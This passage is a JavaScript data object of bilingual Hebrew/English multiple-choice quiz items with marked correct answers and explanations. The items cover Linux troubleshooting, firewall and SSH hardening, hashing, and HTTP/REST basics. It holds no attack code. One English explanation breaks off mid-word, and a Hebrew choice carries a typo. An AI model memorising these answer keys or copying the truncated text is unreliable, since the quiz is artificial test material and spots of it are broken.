        "btrfs supports snapshots, built-in compression, and built-in RAID",
        "btrfs is much faster",
        "btrfs supports larger files",
        "btrfs is more stable"
      ]
    }
  ],

  409: [
    {
      q: "\u200Fמה הצעד הראשון בפתרון תקלה בלינוקס?",
      correct: "\u200Fלבדוק את הלוגים — journalctl או /var/log/syslog",
      choices: [
        "\u200Fלבדוק את הלוגים — journalctl או /var/log/syslog",
        "\u200Fלהפעיל מחדש את השרת",
        "\u200Fלהתקין מחדש את התוכנה",
        "\u200Fלשנות הרשאות קבצים"
      ],
      explanation: "‏המתודולוגיה: הגדר בעיה → בדוק לוגים → בדוק רשת → בדוק דיסק → בדוק תהליכים.\n\nעיקרי:\n- הלוגים הם המקור הראשון למידע",
      explanationEn: "The methodology: define problem → check logs → check network → check disk → check processes.\n\nMain Points:\n- Logs are the first source of information",
      qEn: "What is the first step in troubleshooting a Linux issue?",
      correctEn: "Check the logs — journalctl or /var/log/syslog",
      choicesEn: [
        "Check the logs — journalctl or /var/log/syslog",
        "Restart the server",
        "Reinstall the software",
        "Change file permissions"
      ]
    },
    {
      q: "\u200Fמה מציין load average של 8.0 על שרת עם 4 ליבות?",
      correct: "\u200Fהשרת עמוס פי 2 מהקיבולת שלו\nיש 4 תהליכים שמחכים בתור",
      choices: [
        "\u200Fהשרת עמוס פי 2 מהקיבולת שלו\nיש 4 תהליכים שמחכים בתור",
        "\u200Fהשרת בניצול של 80%",
        "\u200F8 משתמשים מחוברים",
        "\u200F8 GB זיכרון בשימוש"
      ],
      explanation: "‏load average מייצג מספר תהליכים שמחכים ל־CPU.\n\nעיקרי:\n- על 4 ליבות, load 4.0 = 100%\n- load 8.0 = עומס כפול\n- צריך לזהות את הגורם עם top",
      explanationEn: "Load average represents processes waiting for CPU.\n\nMain Points:\n- On 4 cores, load 4.0 = 100%\n- Load 8.0 = double capacity\n- Need to identify the cause with top",
      qEn: "What does a load average of 8.0 mean on a server with 4 cores?",
      correctEn: "The server is at 2x its capacity\n4 processes are waiting in queue",
      choicesEn: [
        "The server is at 2x its capacity\n4 processes are waiting in queue",
        "The server is at 80% utilization",
        "8 users are connected",
        "8 GB of memory in use"
      ]
    },
    {
      q: "\u200Fהפקודה dmesg מציגה הודעות של:",
      correct: "\u200Fגרעין המערכת (Kernel) — חומרה, דרייברים, boot",
      choices: [
        "\u200Fגרעין המערכת (Kernel) — חומרה, דרייברים, boot",
        "\u200Fכל השירותים הפעילים",
        "\u200Fהתחברויות SSH לשרת",
        "\u200Fשגיאות של אפליקציות"
      ],
      explanation: "‏dmesg מציג הודעות kernel — זיהוי דיסקים חדשים, USB, שגיאות חומרה, טעינת דרייברים.\n\nעיקרי:\n- שימושי לאבחון בעיות חומרה\n- dmesg --level=err,warn מסנן שגיאות",
      explanationEn: "dmesg shows kernel messages — new disk detection, USB, hardware errors, driver loading.\n\nMain Points:\n- Useful for hardware troubleshooting\n- dmesg --level=err,warn filters errors",
      qEn: "The dmesg command shows messages from:",
      correctEn: "The system kernel — hardware, drivers, boot",
      choicesEn: [
        "The system kernel — hardware, drivers, boot",
        "All active services",
        "SSH connections to the server",
        "Application errors"
      ]
    },
    {
      q: "\u200Fשרת מראה 'No space left on device'. איך מוצאים מה תופס מקום?",
      correct: "\u200Fdf -h לראות איזו מחיצה מלאה\ndu -h --max-depth=1 / | sort -rh | head לצלול פנימה",
      choices: [
        "\u200Fdf -h לראות איזו מחיצה מלאה\ndu -h --max-depth=1 / | sort -rh | head לצלול פנימה",
        "\u200Fls -la / לראות את כל הקבצים",
        "\u200Ftop לראות צריכת דיסק",
        "\u200Fping localhost לבדוק את השרת"
      ],
      explanation: "‏df -h מראה איזו מחיצה ב־100%.\n\nעיקרי:\n- du --max-depth=1 מוצא את התיקייה הגדולה\n- ממשיכים לצלול עד שמוצאים את הקבצים הגדולים\n- פתרונות נפוצים: ניקוי לוגים, apt clean, מחיקת /tmp",
      explanationEn: "df -h shows which partition is at 100%.\n\nMain Points:\n- du --max-depth=1 finds the large directory\n- Keep drilling until you find the large files\n- Common fixes: clean logs, apt clean, delete /tmp",
      qEn: "A server shows 'No space left on device'. How do you find what's taking space?",
      correctEn: "df -h to see which partition is full\ndu -h --max-depth=1 / | sort -rh | head to drill down",
      choicesEn: [
        "df -h to see which partition is full\ndu -h --max-depth=1 / | sort -rh | head to drill down",
        "ls -la / to see all files",
        "top to see disk usage",
        "ping localhost to check the server"
      ]
    },
    {
      q: "\u200Fמה מציין שימוש גבוה ב-swap בפלט free -m?",
      correct: "\u200Fחסר זיכרון RAM — המערכת משתמשת בדיסק כזיכרון\nזה מאט את המערכת משמעותית",
      choices: [
        "\u200Fחסר זיכרון RAM — המערכת משתמשת בדיסק כזיכרון\nזה מאט את המערכת משמעותית",
        "\u200Fהדיסק מלא",
        "\u200Fיש בעיית רשת",
        "\u200Fהמעבד עמוס"
      ],
      explanation: "‏swap הוא שטח דיסק שמשמש כזיכרון כשה־RAM מלא.\n\nעיקרי:\n- דיסק איטי הרבה יותר מ־RAM, לכן swap גבוה = מערכת איטית\n- הפתרון: הוסיפו RAM או צמצמו תהליכים שאוכלים זיכרון",
      explanationEn: "Swap is disk space used as memory when RAM is full.\n\nMain Points:\n- Disk is much slower than RAM, so high swap = slow system\n- Solution: add RAM or reduce memory-hungry processes",
      qEn: "What does high swap usage in free -m output indicate?",
      correctEn: "Not enough RAM — the system uses disk as memory\nThis significantly slows the system",
      choicesEn: [
        "Not enough RAM — the system uses disk as memory\nThis significantly slows the system",
        "The disk is full",
        "There's a network issue",
        "The CPU is overloaded"
      ]
    }
  ],

  410: [
    {
      q: "\u200Fמה העיקרון הבסיסי של firewall?",
      correct: "\u200Fחסום הכל כברירת מחדל\nפתח רק מה שצריך",
      choices: [
        "\u200Fחסום הכל כברירת מחדל\nפתח רק מה שצריך",
        "\u200Fפתח הכל וחסום מה שמסוכן",
        "\u200Fחסום רק פורטים מוכרים",
        "\u200Fאפשר גישה רק מ־IP מקומי"
      ],
      explanation: "‏ב-ufw\n\nעיקרי:\n- sudo ufw default deny incoming\n- ואז פותחים פורטים ספציפיים\n- sudo ufw allow 22 (SSH)",
      explanationEn: "In ufw: sudo ufw default deny incoming, then open specific ports: sudo ufw allow 22 (SSH), sudo ufw allow 80 (HTTP), sudo ufw allow 443 (HTTPS)..\n\nMain Points:\n- In ufw: sudo ufw default deny incoming, then open specific p",
      qEn: "What is the basic principle of a firewall?",
      correctEn: "Block everything by default\nOpen only what's needed",
      choicesEn: [
        "Block everything by default\nOpen only what's needed",
        "Open everything and block what's dangerous",
        "Block only well-known ports",
        "Allow access only from local IP"
      ]
    },
    {
      q: "\u200Fמה עושה fail2ban ואיך הוא מגן על SSH?",
      correct: "\u200Fעוקב אחרי לוגים וחוסם אוטומטית IPs\nשמנסים brute force (אחרי מספר כישלונות מוגדר)",
      choices: [
        "\u200Fעוקב אחרי לוגים וחוסם אוטומטית IPs\nשמנסים brute force (אחרי מספר כישלונות מוגדר)",
        "\u200Fמצפין את חיבור SSH",
        "\u200Fמשנה את פורט SSH אוטומטית",
        "\u200Fמגביל את מהירות הרשת"
      ],
      explanation: "‏fail2ban עוקב אחרי /var/log/auth.log.\n\nעיקרי:\n- אחרי maxretry ניסיונות כושלים בתוך findtime — חוסם את ה־IP עם iptables למשך bantime",
      explanationEn: "fail2ban monitors /var/log/auth.log.\n\nMain Points:\n- After maxretry failed attempts within findtime — blocks the IP with iptables for bantime duration",
      qEn: "What does fail2ban do and how does it protect SSH?",
      correctEn: "Monitors logs and automatically blocks IPs\nthat attempt brute force (after defined number of failures)",
      choicesEn: [
        "Monitors logs and automatically blocks IPs\nthat attempt brute force (after defined number of failures)",
        "Encrypts the SSH connection",
        "Automatically changes the SSH port",
        "Limits network speed"
      ]
    },
    {
      q: "\u200Fלמה חשוב לבדוק שחיבור SSH חדש עובד לפני שסוגרים את הנוכחי?",
      correct: "\u200Fאם ביטלתם סיסמאות בלי מפתח עובד\nתינעלו מחוץ לשרת ולא תוכלו להתחבר",
      choices: [
        "\u200Fאם ביטלתם סיסמאות בלי מפתח עובד\nתינעלו מחוץ לשרת ולא תוכלו להתחבר",
        "\u200Fכדי לא לאבד את היסטוריית הפקודות",
        "\u200Fכדי לחסוך ברוחב פס",
        "\u200Fאין סיבה מיוחדת — זה רק המלצה"
      ],
      explanation: "‏סדר נכון: צור משתמש → העתק מפתח SSH → בדוק חיבור מטרמינל שני → רק אז שנה sshd_config → restart SSH → בדוק שוב.\n\nעיקרי:\n- אל תסגור את הטרמינל הנוכחי",
      explanationEn: "Correct order: create user → copy SSH key → test connection from second terminal → only then change sshd_config → restart SSH → test again.\n\nMain Points:\n- Don't close the current terminal",
      qEn: "Why is it important to verify a new SSH connection works before closing the current one?",
      correctEn: "If you disabled passwords without a working key\nyou'll be locked out of the server with no way to connect",
      choicesEn: [
        "If you disabled passwords without a working key\nyou'll be locked out of the server with no way to connect",
        "To not lose command history",
        "To save bandwidth",
        "No special reason — it's just a recommendation"
      ]
    },
    {
      q: "\u200Fמה עושה sha256sum ולמה הוא חשוב?",
      correct: "\u200Fיוצר חתימה דיגיטלית (hash) של קובץ\nכל שינוי בקובץ — גם ביט אחד — משנה את ה-hash לגמרי",
      choices: [
        "\u200Fיוצר חתימה דיגיטלית (hash) של קובץ\nכל שינוי בקובץ — גם ביט אחד — משנה את ה-hash לגמרי",
        "\u200Fמצפין קובץ עם סיסמה",
        "\u200Fדוחס קובץ לגודל קטן",
        "\u200Fמעתיק קובץ בצורה בטוחה"
      ],
      explanation: "‏sha256sum משמש לאימות שלמות — לוודא שקובץ שהורדנו לא פגום או זויף.\n\nעיקרי:\n- גם לזיהוי שינויים בקבצי מערכת (פריצה?)\n- sha256sum --check checksums.txt בודק אם משהו השתנה",
      explanationEn: "sha256sum is used for integrity verification — ensuring a downloaded file isn't corrupted or tampered with.\n\nMain Points:\n- Also for detecting changes to system files (breach?)\n- sha256sum --check checksums.txt checks if anything changed",
      qEn: "What does sha256sum do and why is it important?",
      correctEn: "Creates a digital signature (hash) of a file\nAny change to the file — even one bit — completely changes the hash",
      choicesEn: [
        "Creates a digital signature (hash) of a file\nAny change to the file — even one bit — completely changes the hash",
        "Encrypts a file with a password",
        "Compresses a file to smaller size",
        "Copies a file securely"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין ufw לבין iptables?",
      correct: "\u200Fufw — ממשק פשוט ונוח (Uncomplicated Firewall)\niptables — כלי מסורתי חזק יותר אבל מורכב יותר",
      choices: [
        "\u200Fufw — ממשק פשוט ונוח (Uncomplicated Firewall)\niptables — כלי מסורתי חזק יותר אבל מורכב יותר",
        "\u200Fufw חזק יותר מ-iptables",
        "\u200Fiptables עובד רק על Ubuntu",
        "\u200Fshניהם זהים — רק שמות שונים"
      ],
      explanation: "‏ufw הוא בעצם ממשק ידידותי מעל iptables.\n\nעיקרי:\n- הוא מתרגם פקודות פשוטות כמו 'ufw allow 80' לחוקי iptables מורכבים\n- לשימוש בסיסי — ufw מספיק\n- למקרים מתקדמים — iptables",
      explanationEn: "ufw is actually a friendly interface on top of iptables.\n\nMain Points:\n- It translates simple commands like 'ufw allow 80' to complex iptables rules\n- For basic use — ufw is enough\n- For advanced cases — iptables",
      qEn: "What is the difference between ufw and iptables?",
      correctEn: "ufw — simple and convenient interface (Uncomplicated Firewall)\niptables — traditional tool, more powerful but more complex",
      choicesEn: [
        "ufw — simple and convenient interface (Uncomplicated Firewall)\niptables — traditional tool, more powerful but more complex",
        "ufw is more powerful than iptables",
        "iptables only works on Ubuntu",
        "Both are identical — just different names"
      ]
    }
  ],

  // ============================================================
  // Web & APIs Track — Chapters 501-508
  // ============================================================

  501: [
    {
      q: "\u200Fמה ההבדל בין Query String ל־Fragment ב־URL?",
      correct: "\u200FQuery String (?key=val) נשלח לשרת\nFragment (#section) לא נשלח — רק לדפדפן",
      choices: [
        "\u200FQuery String (?key=val) נשלח לשרת\nFragment (#section) לא נשלח — רק לדפדפן",
        "\u200Fשניהם נשלחים לשרת",
        "\u200FFragment נשלח לשרת\nQuery String לא",
        "\u200Fאין הבדל — שניהם זהים"
      ],
      explanation: "‏Query String (?color=red&size=42) מועבר לשרת ומשמש לסינון/חיפוש.\n\nעיקרי:\n- Fragment (#reviews) משמש רק את הדפדפן — לגלילה לחלק מסוים בדף\n- השרת אף פעם לא רואה את ה־Fragment",
      explanationEn: "Query String (?color=red&size=42) is sent to the server for filtering/search.\n\nMain Points:\n- Fragment (#reviews) is only used by the browser — for scrolling to a page section\n- The server never sees the Fragment",
      qEn: "What is the difference between Query String and Fragment in a URL?",
      correctEn: "Query String (?key=val) is sent to the server\nFragment (#section) is not sent — browser only",
      choicesEn: [
        "Query String (?key=val) is sent to the server\nFragment (#section) is not sent — browser only",
        "Both are sent to the server",
        "Fragment is sent to the server\nQuery String is not",
        "No difference — both are identical"
      ]
    },
    {
      q: "\u200Fמהם שלושת השלבים של TCP Three-Way Handshake?",
      correct: "\u200FSYN → SYN-ACK → ACK",
      choices: [
        "\u200FSYN → SYN-ACK → ACK",
        "\u200FACK → SYN → SYN-ACK",
        "\u200FHELLO → OK → START",
        "\u200FGET → POST → PUT"
      ],
      explanation: "‏הלקוח שולח SYN (רוצה להתחבר), השרת עונה SYN-ACK (מוכן), הלקוח מאשר ACK (מתחילים).\n\nעיקרי:\n- שלושה שלבים כדי ששני הצדדים ידעו שהחיבור עובד בשני הכיוונים",
      explanationEn: "Client sends SYN (want to connect), server replies SYN-ACK (ready), client confirms ACK (let's start).\n\nMain Points:\n- Three steps so both sides know the connection works in both directions",
      qEn: "What are the three steps of the TCP Three-Way Handshake?",
      correctEn: "SYN → SYN-ACK → ACK",
      choicesEn: [
        "SYN → SYN-ACK → ACK",
        "ACK → SYN → SYN-ACK",
        "HELLO → OK → START",
        "GET → POST → PUT"
      ]
    },
    {
      q: "\u200Fמה תפקיד ה־TLS Handshake?",
      correct: "\u200Fהצפנת החיבור — אימות השרת עם תעודה דיגיטלית\nוהסכמה על מפתח הצפנה משותף",
      choices: [
        "\u200Fהצפנת החיבור — אימות השרת עם תעודה דיגיטלית\nוהסכמה על מפתח הצפנה משותף",
        "\u200Fתרגום שם דומיין לכתובת IP",
        "\u200Fיצירת חיבור TCP",
        "\u200Fשליחת בקשת HTTP לשרת"
      ],
      explanation: "‏TLS Handshake מתבצע אחרי TCP Handshake.\n\nעיקרי:\n- הלקוח מוודא שהתעודה הדיגיטלית של השרת חתומה ע\"י CA מוכר, ושני הצדדים מסכימים על מפתח הצפנה\n- מכאן כל התקשורת מוצפנת",
      explanationEn: "TLS Handshake happens after TCP Handshake.\n\nMain Points:\n- The client verifies the server's digital certificate is signed by a trusted CA, and both sides agree on an encryption key\n- From here all communication is encrypted",
      qEn: "What is the purpose of the TLS Handshake?",
      correctEn: "Encrypting the connection — authenticating the server with a digital certificate\nand agreeing on a shared encryption key",
      choicesEn: [
        "Encrypting the connection — authenticating the server with a digital certificate\nand agreeing on a shared encryption key",
        "Translating a domain name to an IP address",
        "Creating a TCP connection",
        "Sending an HTTP request to the server"
      ]
    },
    {
      q: "\u200Fמה מסמן TTL בהקשר של DNS?",
      correct: "\u200FTime To Live — כמה זמן (בשניות) תוצאת DNS נשמרת ב-cache",
      choices: [
        "\u200FTime To Live — כמה זמן (בשניות) תוצאת DNS נשמרת ב-cache",
        "\u200Fמספר הקפיצות המקסימלי של חבילה",
        "\u200Fזמן שהשרת לוקח לענות",
        "\u200Fגודל חבילת ה־DNS"
      ],
      explanation: "‏TTL גבוה (למשל 3600 שניות = שעה) מפחית עומס על שרתי DNS אבל מאט עדכון שינויים.\n\nעיקרי:\n- TTL נמוך (60 שניות) מאפשר עדכון מהיר אבל יוצר יותר שאילתות DNS",
      explanationEn: "High TTL (e.g., 3600 seconds = 1 hour) reduces load on DNS servers but slows change propagation.\n\nMain Points:\n- Low TTL (60 seconds) enables quick updates but generates more DNS queries",
      qEn: "What does TTL mean in the context of DNS?",
      correctEn: "Time To Live — how long (in seconds) a DNS result is cached",
      choicesEn: [
        "Time To Live — how long (in seconds) a DNS result is cached",
        "Maximum number of hops for a packet",
        "Time the server takes to respond",
        "Size of the DNS packet"
      ]
    },
    {
      q: "\u200Fבמודל לקוח-שרת, מי יוזם את התקשורת?",
      correct: "\u200Fהלקוח (הדפדפן) תמיד יוזם — השרת רק מגיב",
      choices: [
        "\u200Fהלקוח (הדפדפן) תמיד יוזם — השרת רק מגיב",
        "\u200Fהשרת יוזם — הלקוח מגיב",
        "\u200Fשניהם יכולים ליזום בכל רגע",
        "\u200Fתלוי בסוג הפרוטוקול"
      ],
      explanation: "‏ב־HTTP, הלקוח תמיד שולח בקשה (Request) והשרת מחזיר תגובה (Response).\n\nעיקרי:\n- זה שונה מ־WebSockets, שם שני הצדדים יכולים לשלוח הודעות",
      explanationEn: "In HTTP, the client always sends a Request and the server returns a Response.\n\nMain Points:\n- This differs from WebSockets, where both sides can send messages",
      qEn: "In the client-server model, who initiates communication?",
      correctEn: "The client (browser) always initiates — the server only responds",
      choicesEn: [
        "The client (browser) always initiates — the server only responds",
        "The server initiates — the client responds",
        "Both can initiate at any time",
        "Depends on the protocol type"
      ]
    }
  ],

  502: [
    {
      q: "\u200Fמה הבעיה העיקרית של HTTP/1.1 ש־HTTP/2 פותר?",
      correct: "\u200FHead-of-Line Blocking — בקשה אחת שתקועה חוסמת את כל השאר\nHTTP/2 מאפשר multiplexing",
      choices: [
        "\u200FHead-of-Line Blocking — בקשה אחת שתקועה חוסמת את כל השאר\nHTTP/2 מאפשר multiplexing",
        "\u200FHTTP/1.1 לא תומך בהצפנה",
        "\u200FHTTP/1.1 לא תומך ב-cookies",
        "\u200FHTTP/1.1 לא יכול לשלוח תמונות"
      ],
      explanation: "‏ב־HTTP/1.1 כל חיבור TCP טופל בקשה אחת.\n\nעיקרי:\n- HTTP/2 מוסיף multiplexing — הרבה בקשות ותגובות במקביל על חיבור אחד, + דחיסת headers (HPACK)",
      explanationEn: "In HTTP/1.1 each TCP connection handled one request.\n\nMain Points:\n- HTTP/2 adds multiplexing — many requests and responses in parallel on one connection, + header compression (HPACK)",
      qEn: "What is the main problem of HTTP/1.1 that HTTP/2 solves?",
      correctEn: "Head-of-Line Blocking — one stuck request blocks all others\nHTTP/2 enables multiplexing",
      choicesEn: [
        "Head-of-Line Blocking — one stuck request blocks all others\nHTTP/2 enables multiplexing",
        "HTTP/1.1 doesn't support encryption",
        "HTTP/1.1 doesn't support cookies",
        "HTTP/1.1 can't send images"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין קוד 401 לבין 403?",
      correct: "\u200F401 = לא מזוהה (Authentication — שכחת טוקן)\n403 = מזוהה אבל אין הרשאה (Authorization)",
      choices: [
        "\u200F401 = לא מזוהה (Authentication — שכחת טוקן)\n403 = מזוהה אבל אין הרשאה (Authorization)",
        "\u200F401 = אין הרשאה\n403 = לא מזוהה",
        "\u200F401 = שגיאת שרת\n403 = שגיאת לקוח",
        "\u200Fשניהם אומרים את אותו הדבר"
      ],
      explanation: "‏401 — לא שלחת טוקן, או שהטוקן פג תוקף.\n\nעיקרי:\n- 403 — השרת יודע מי אתה, אבל אתה לא מורשה\n- למשל: משתמש רגיל מנסה לגשת לפאנל admin",
      explanationEn: "401 — you didn't send a token, or the token expired.\n\nMain Points:\n- 403 — the server knows who you are, but you're not authorized\n- Example: regular user trying to access admin panel",
      qEn: "What is the difference between status code 401 and 403?",
      correctEn: "401 = not identified (Authentication — forgot token)\n403 = identified but no permission (Authorization)",
      choicesEn: [
        "401 = not identified (Authentication — forgot token)\n403 = identified but no permission (Authorization)",
        "401 = no permission\n403 = not identified",
        "401 = server error\n403 = client error",
        "Both mean the same thing"
      ]
    },
    {
      q: "\u200Fלמה חשוב לסמן cookie כ־HttpOnly?",
      correct: "\u200Fמונע מ־JavaScript לגשת ל-cookie\nמגן מפני התקפות XSS שגונבות session tokens",
      choices: [
        "\u200Fמונע מ־JavaScript לגשת ל-cookie\nמגן מפני התקפות XSS שגונבות session tokens",
        "\u200Fמצפין את ה-cookie",
        "\u200Fשולח cookie רק ב־HTTP (לא HTTPS)",
        "\u200Fמגביל את גודל ה-cookie"
      ],
      explanation: "‏בלי HttpOnly, סקריפט זדוני (XSS) יכול לקרוא document.cookie ולגנוב את ה-session.\n\nעיקרי:\n- עם HttpOnly — JavaScript לא יכול לגשת ל-cookie כלל, גם אם הצליח להזריק קוד",
      explanationEn: "Without HttpOnly, a malicious script (XSS) can read document.cookie and steal the session.\n\nMain Points:\n- With HttpOnly — JavaScript cannot access the cookie at all, even if code injection succeeded",
      qEn: "Why is it important to mark a cookie as HttpOnly?",
      correctEn: "Prevents JavaScript from accessing the cookie\nProtects against XSS attacks that steal session tokens",
      choicesEn: [
        "Prevents JavaScript from accessing the cookie\nProtects against XSS attacks that steal session tokens",
        "Encrypts the cookie",
        "Sends cookie only over HTTP (not HTTPS)",
        "Limits the cookie size"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין Cache-Control: no-cache לבין no-store?",
      correct: "\u200Fno-cache — שומר עותק אבל בודק עם השרת לפני שימוש\nno-store — לא שומר בכלל (למידע רגיש)",
      choices: [
        "\u200Fno-cache — שומר עותק אבל בודק עם השרת לפני שימוש\nno-store — לא שומר בכלל (למידע רגיש)",
        "\u200Fno-cache = לא שומר\nno-store = שומר",
        "\u200Fשניהם לא שומרים cache",
        "\u200Fno-cache לתמונות\nno-store לטקסט"
      ],
      explanation: "‏no-cache — הדפדפן שומר עותק אבל שואל את השרת 'זה עדיין עדכני?' לפני שימוש.\n\nעיקרי:\n- no-store — אסור לשמור כלל, אפילו לא זמנית\n- משתמשים ב-no-store למידע רגיש כמו פרטי בנק",
      explanationEn: "no-cache — the browser keeps a copy but asks the server 'is this still current?' before use.\n\nMain Points:\n- no-store — must not store at all, not even temporarily\n- Use no-store for sensitive data like banking details",
      qEn: "What is the difference between Cache-Control: no-cache and no-store?",
      correctEn: "no-cache — keeps a copy but checks with server before use\nno-store — doesn't store at all (for sensitive data)",
      choicesEn: [
        "no-cache — keeps a copy but checks with server before use\nno-store — doesn't store at all (for sensitive data)",
        "no-cache = don't store\nno-store = store",
        "Both don't store cache",
        "no-cache for images\nno-store for text"
      ]
    },
    {
      q: "\u200Fעל מה מבוסס HTTP/3?",
      correct: "\u200Fעל פרוטוקול QUIC מעל UDP — במקום TCP\nחיבור מהיר יותר וללא Head-of-Line Blocking ברמת ה-transport",
      choices: [
        "\u200Fעל פרוטוקול QUIC מעל UDP — במקום TCP\nחיבור מהיר יותר וללא Head-of-Line Blocking ברמת ה-transport",
        "\u200Fעל TCP עם דחיסה משופרת",
        "\u200Fעל WebSockets",
        "\u200Fעל IP ישירות בלי שכבת transport"
      ],
      explanation: "‏HTTP/3 משתמש ב־QUIC (פרוטוקול של Google) מעל UDP.\n\nעיקרי:\n- TLS + transport בלחיצת יד אחת\n- כל stream עצמאי — אם חבילה אחת אבדה, היא לא חוסמת streams אחרים",
      explanationEn: "HTTP/3 uses QUIC (a Google protocol) over UDP.\n\nMain Points:\n- TLS + transport in one handshake\n- Each stream is independent — if one packet is lost, it doesn't block other streams",
      qEn: "What is HTTP/3 based on?",
      correctEn: "The QUIC protocol over UDP — instead of TCP\nFaster connection and no transport-level Head-of-Line Blocking",
      choicesEn: [
        "The QUIC protocol over UDP — instead of TCP\nFaster connection and no transport-level Head-of-Line Blocking",
        "TCP with improved compression",
        "WebSockets",
        "IP directly without a transport layer"
      ]
    }
  ],

  503: [
    {
      q: "\u200Fמה ההבדל בין PUT לבין PATCH?",
      correct: "\u200FPUT מחליף את כל המשאב — צריך לשלוח את כל השדות\nPATCH מעדכן רק שדות ספציפיים",
      choices: [
        "\u200FPUT מחליף את כל המשאב — צריך לשלוח את כל השדות\nPATCH מעדכן רק שדות ספציפיים",
        "\u200FPUT ליצירה\nPATCH למחיקה",
        "\u200FPUT לקריאה\nPATCH לכתיבה",
        "\u200Fאין הבדל — שניהם זהים"
      ],
      explanation: "‏לדוגמה: אם רוצים לשנות רק את האימייל של משתמש — PATCH /api/users/5 {\"email\": \"new@e.com\"} מספיק.\n\nעיקרי:\n- PUT ידרוש לשלוח את כל פרטי המשתמש מחדש",
      explanationEn: "For example: to change only a user's email — PATCH /api/users/5 {\"email\": \"new@e.com\"} is enough.\n\nMain Points:\n- PUT would require sending all user details again",
      qEn: "What is the difference between PUT and PATCH?",
      correctEn: "PUT replaces the entire resource — must send all fields\nPATCH updates only specific fields",
      choicesEn: [
        "PUT replaces the entire resource — must send all fields\nPATCH updates only specific fields",
        "PUT for creation\nPATCH for deletion",
        "PUT for reading\nPATCH for writing",
        "No difference — both are identical"
      ]
    },
    {
      q: "\u200Fמה מחזיר שרת REST אחרי בקשת POST מוצלחת?",
      correct: "\u200Fקוד 201 Created + המשאב שנוצר בגוף התגובה\nכולל שדות שהשרת יצר (כמו id)",
      choices: [
        "\u200Fקוד 201 Created + המשאב שנוצר בגוף התגובה\nכולל שדות שהשרת יצר (כמו id)",
        "\u200Fקוד 200 OK בלבד",
        "\u200Fקוד 204 No Content",
        "\u200Fקוד 301 Redirect"
      ],
      explanation: "‏אחרי POST מוצלח, השרת מחזיר 201 Created עם המשאב שנוצר — כולל id ייחודי, created_at, ושדות נוספים שהשרת מייצר.\n\nעיקרי:\n- לעתים גם כותרת Location עם ה־URL החדש",
      explanationEn: "After a successful POST, the server returns 201 Created with the created resource — including unique id, created_at, and other server-generated fields.\n\nMain Points:\n- Sometimes also a Location header with the new URL",
      qEn: "What does a REST server return after a successful POST request?",
      correctEn: "Status 201 Created + the created resource in response body\nincluding server-generated fields (like id)",
      choicesEn: [
        "Status 201 Created + the created resource in response body\nincluding server-generated fields (like id)",
        "Status 200 OK only",
        "Status 204 No Content",
        "Status 301 Redirect"
      ]
    },
    {
      q: "\u200Fמתי משתמשים ב־Path Parameter ומתי ב־Query Parameter?",
      correct: "\u200FPath Parameter לזיהוי משאב (/users/42)\nQuery Parameter לסינון/מיון (?role=admin)",
      choices: [
        "\u200FPath Parameter לזיהוי משאב (/users/42)\nQuery Parameter לסינון/מיון (?role=admin)",
        "\u200FPath תמיד אופציונלי\nQuery תמיד חובה",
        "\u200FPath למספרים\nQuery לטקסט",
        "\u200Fאין כלל — שניהם מתחלפים"
      ],
      explanation: "‏Path Parameters הם חלק מהנתיב ובדרך כלל חובה — /users/42 מזהה משתמש ספציפי.\n\nעיקרי:\n- Query Parameters אופציונליים — /users?role=admin&sort=name מסנן וממיין",
      explanationEn: "Path Parameters are part of the path and usually required — /users/42 identifies a specific user.\n\nMain Points:\n- Query Parameters are optional — /users?role=admin&sort=name filters and sorts",
      qEn: "When do you use Path Parameter vs Query Parameter?",
      correctEn: "Path Parameter to identify a resource (/users/42)\nQuery Parameter for filtering/sorting (?role=admin)",
      choicesEn: [
        "Path Parameter to identify a resource (/users/42)\nQuery Parameter for filtering/sorting (?role=admin)",
        "Path is always optional\nQuery is always required",
        "Path for numbers\nQuery for text",
        "No rule — both are interchangeable"
      ]
    },
    {
      q: "\u200Fמהו CRUD ואיך הוא ממופה לשיטות HTTP?",
      correct: "\u200FCreate=POST, Read=GET, Update=PUT/PATCH, Delete=DELETE",
      choices: [
        "\u200FCreate=POST, Read=GET, Update=PUT/PATCH, Delete=DELETE",
        "\u200FCreate=GET, Read=POST, Update=DELETE, Delete=PUT",
        "\u200FCreate=PUT, Read=POST, Update=GET, Delete=PATCH",
        "\u200FCRUD לא קשור ל־HTTP"
      ],
      explanation: "‏CRUD = ארבע הפעולות הבסיסיות על מידע.\n\nעיקרי:\n- ב־REST API: POST ליצירה, GET לקריאה, PUT/PATCH לעדכון, DELETE למחיקה\n- זה הבסיס של כל API",
      explanationEn: "CRUD = the four basic data operations.\n\nMain Points:\n- In REST API: POST for create, GET for read, PUT/PATCH for update, DELETE for delete\n- This is the foundation of every API",
      qEn: "What is CRUD and how does it map to HTTP methods?",
      correctEn: "Create=POST, Read=GET, Update=PUT/PATCH, Delete=DELETE",
      choicesEn: [
        "Create=POST, Read=GET, Update=PUT/PATCH, Delete=DELETE",
        "Create=GET, Read=POST, Update=DELETE, Delete=PUT",
        "Create=PUT, Read=POST, Update=GET, Delete=PATCH",
        "CRUD is not related to HTTP"
      ]
    },
    {
      q: "\u200Fלמה API צריך versioning?",
      correct: "\u200Fכדי שלקוחות ישנים ימשיכו לעבוד\nכששינוי ב־API שובר תאימות",
      choices: [
        "\u200Fכדי שלקוחות ישנים ימשיכו לעבוד\nכששינוי ב־API שובר תאימות",
        "\u200Fכדי לשפר ביצועים",
        "\u200Fכדי להוסיף אבטחה",
        "\u200Fזה לא באמת צריך"
      ],
      explanation: "‏כשמשנים מבנה תגובה או מוחקים שדה, לקוחות ישנים יישברו.\n\nעיקרי:\n- /api/v1/users ו-/api/v2/users רצים במקביל — לקוחות ישנים משתמשים ב-v1, חדשים ב-v2",
      explanationEn: "When response structure changes or a field is deleted, old clients break.\n\nMain Points:\n- /api/v1/users and /api/v2/users run in parallel — old clients use v1, new ones use v2",
      qEn: "Why does an API need versioning?",
      correctEn: "So old clients continue working\nwhen API changes break compatibility",
      choicesEn: [
        "So old clients continue working\nwhen API changes break compatibility",
        "To improve performance",
        "To add security",
        "It's not really needed"
      ]
    }
  ],

  504: [
    {
      q: "\u200Fמה ההבדל בין Authentication לבין Authorization?",
      correct: "\u200FAuthentication = 'מי אתה?' (זיהוי)\nAuthorization = 'מה מותר לך?' (הרשאות)",
      choices: [
        "\u200FAuthentication = 'מי אתה?' (זיהוי)\nAuthorization = 'מה מותר לך?' (הרשאות)",
        "\u200Fשניהם עוסקים בזיהוי",
        "\u200FAuthentication = הרשאות\nAuthorization = זיהוי",
